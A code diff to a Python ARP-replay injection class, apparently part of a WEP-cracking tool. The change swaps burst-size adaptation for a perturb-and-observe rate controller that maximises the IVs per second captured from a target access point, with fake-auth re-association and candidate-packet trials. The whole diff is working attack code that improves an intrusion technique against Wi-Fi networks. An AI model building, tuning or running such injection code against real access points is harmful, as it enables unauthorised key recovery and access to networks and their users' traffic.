@@ -53,10 +53,33 @@ class ArpReplayStats:
 
 
 class WepArpReplay:
-    """ARP-replay loop with patient candidate testing + adaptive burst sizing."""
+    """ARP-replay loop with patient candidate testing + P&O rate control.
 
-    _MIN_BURST = 16
-    _MAX_BURST = 1024
+    Injection rate is tuned by **perturb-and-observe** (the solar-MPPT
+    algorithm) to MAXIMIZE IVs/s — the real objective — rather than maximizing
+    pps or capture%. Hardware showed a single interior optimum (~80-120 pps on
+    the dd-wrt box): below it we under-drive the AP, above it we overflow its
+    rebroadcast queue + starve our half-duplex RX, so IVs/s falls on BOTH sides.
+    P&O finds + hovers at that peak on whatever AP it's pointed at: step the
+    rate, wait LONGER than the AP's relay delay (~1-2s), measure IVs/s, keep the
+    step's direction if IVs/s improved else reverse. (The old climber failed
+    because it hill-climbed burst size on PER-CYCLE gain — a window shorter than
+    the relay delay, so it climbed on misattributed noise to max burst.)
+    """
+
+    # P&O rate controller. Control var = injection pps; objective = IVs/s
+    # measured over a DWELL that exceeds the AP relay delay (so a step's IVs have
+    # landed before we judge it). Start near the observed optimum to converge
+    # fast; bounds keep the search sane.
+    _PO_DWELL_S = 3.0
+    _PO_STEP_PPS = 16.0
+    _PO_START_PPS = 96.0
+    _PO_MIN_PPS = 24.0
+    _PO_MAX_PPS = 500.0
+    # Relative improvement deadband — only reverse on a real drop, so per-dwell
+    # noise doesn't cause needless thrashing at the peak.
+    _PO_IMPROVE_EPS = 0.03
+    _BURST = 16          # frames per cycle (granularity; the pace sets the rate)
     # How long to keep testing one candidate before judging it (seconds). The
     # AP's relayed rebroadcast can lag the burst, so don't condemn on one cycle.
     _TRIAL_WINDOW = 2.5
@@ -104,13 +127,13 @@ class WepArpReplay:
         self._paused = False
         self._task: Optional[asyncio.Task] = None
 
-        self._burst_size = 32
-        # Adaptive climber state: track best IV throughput (unique IVs/sec) and
-        # only back off after a sustained drop, so we climb to and HOLD near
-        # the hardware cap instead of oscillating on per-cycle gain noise.
-        self._best_throughput = 0.0
-        self._poor_streak = 0
-        self._last_cycle_dt = 0.1
+        self._burst_size = self._BURST
+        # P&O rate-controller state.
+        self._rate = self._PO_START_PPS       # current target injection pps
+        self._rate_step = self._PO_STEP_PPS   # signed perturbation
+        self._po_prev_ivs_s = -1.0            # last dwell's measured IVs/s
+        self._po_window_start = 0.0           # dwell start time
+        self._po_window_ivs0 = 0              # unique IVs at dwell start
 
         # Candidate under test/replay + its trial accounting.
         self._current: Optional[bytes] = None
@@ -138,6 +161,11 @@ class WepArpReplay:
         self._active = True
         self.stats = ArpReplayStats()
         self._unique_baseline = self.collector.unique_count(self.bssid)
+        # Fresh P&O search each session.
+        self._rate = self._PO_START_PPS
+        self._rate_step = self._PO_STEP_PPS
+        self._po_prev_ivs_s = -1.0
+        self._po_window_start = 0.0
         self._task = asyncio.create_task(self._replay_loop())
         logger.info("[WEP-ARP] Replay started on %s", self.bssid)
 
@@ -225,6 +253,7 @@ class WepArpReplay:
                 gain = await self._burst_and_measure(self._current)
                 self._trial_gain += gain
                 self._judge(gain)
+                self._maybe_adjust_rate()
                 self._maybe_heartbeat()
         except asyncio.CancelledError:
             pass
@@ -284,10 +313,12 @@ class WepArpReplay:
         send_dt = max(1e-3, time.time() - t0)   # burst only — the hardware cap
         if sent:
             self._notify_activity()   # our traffic keeps the assoc alive
-        # Pure-RX window — let the AP's rebroadcasts (fresh IVs) land.
-        await asyncio.sleep(self.rx_window)
+        # Pace this cycle to the P&O-chosen rate (frames/_rate), with the
+        # leftover time serving as the RX window for rebroadcasts to land;
+        # never shorter than rx_window.
+        desired_cycle = self._burst_size / max(1.0, self._rate)
+        await asyncio.sleep(max(self.rx_window, desired_cycle - send_dt))
         cycle_dt = max(1e-3, time.time() - t0)
-        self._last_cycle_dt = cycle_dt
         self.stats.cycles += 1
         self.stats.raw_pps = sent / send_dt
         self.stats.effective_pps = sent / cycle_dt
@@ -305,7 +336,6 @@ class WepArpReplay:
             if gain > 0:
                 self._stall_started = 0.0
                 self._reauth_requested = False
-                self._adapt(gain)
                 return
             # Winner went quiet — likely we got de-associated. Give it a grace
             # period, ask fake-auth to re-auth, and only demote if it stays dead.
@@ -344,26 +374,46 @@ class WepArpReplay:
             self.stats.candidates_failed = len(self._failed)
             self._current = None
 
-    def _adapt(self, gain: int) -> None:
-        """Climb burst size toward peak IV THROUGHPUT (unique IVs/sec) and hold.
+    def _reset_po_window(self) -> None:
+        """(Re)start the P&O measurement dwell at the current IV count."""
+        self._po_window_start = time.time()
+        self._po_window_ivs0 = self.collector.unique_count(self.bssid)
 
-        Grows while we're still within ~85% of the best throughput seen (i.e.
-        bigger bursts keep paying off, or we've plateaued at the hardware cap —
-        either way keep pushing toward the ceiling). Only backs off after a
-        SUSTAINED drop (3 cycles), so per-cycle gain noise doesn't drag us down
-        off the cap the way the old record-chasing climber did.
+    def _maybe_adjust_rate(self) -> None:
+        """Perturb-and-observe step on the injection rate, run once per dwell —
+        ONLY while actively replaying a winner (otherwise IVs/s isn't a clean
+        function of our rate). Measures IVs/s over the dwell (a window longer
+        than the AP's relay delay), then keeps the perturbation's direction if
+        IVs/s improved, else reverses — so the rate converges to and dithers
+        around the IVs/s peak.
         """
-        throughput = gain / self._last_cycle_dt
-        if throughput >= self._best_throughput * 0.85:
-            self._best_throughput = max(self._best_throughput, throughput)
-            self._poor_streak = 0
-            self._burst_size = min(self._MAX_BURST, int(self._burst_size * 1.3) + 1)
+        if self.state != "replaying":
+            # No steady injection to measure; hold rate + keep the window fresh.
+            self._reset_po_window()
+            return
+        if self._po_window_start == 0.0:
+            self._reset_po_window()
+            return
+        now = time.time()
+        dwell = now - self._po_window_start
+        if dwell < self._PO_DWELL_S:
+            return
+        ivs_now = self.collector.unique_count(self.bssid)
+        measured = (ivs_now - self._po_window_ivs0) / dwell   # IVs/s this dwell
+
+        if self._po_prev_ivs_s < 0:
+            # First measurement — no baseline yet; just record + take a step.
+            self._po_prev_ivs_s = measured
         else:
-            self._poor_streak += 1
-            if self._poor_streak >= 3:
-                self._poor_streak = 0
-                self._burst_size = max(self._MIN_BURST, int(self._burst_size * 0.8))
-                self._best_throughput *= 0.9   # let it re-probe upward later
+            # Reverse only on a real drop (deadband absorbs per-dwell noise).
+            if measured < self._po_prev_ivs_s * (1.0 - self._PO_IMPROVE_EPS):
+                self._rate_step = -self._rate_step
+            self._po_prev_ivs_s = measured
+
+        self._rate = min(
+            self._PO_MAX_PPS, max(self._PO_MIN_PPS, self._rate + self._rate_step)
+        )
+        self._reset_po_window()
 
     # ---- Logging ------------------------------------------------------------
 
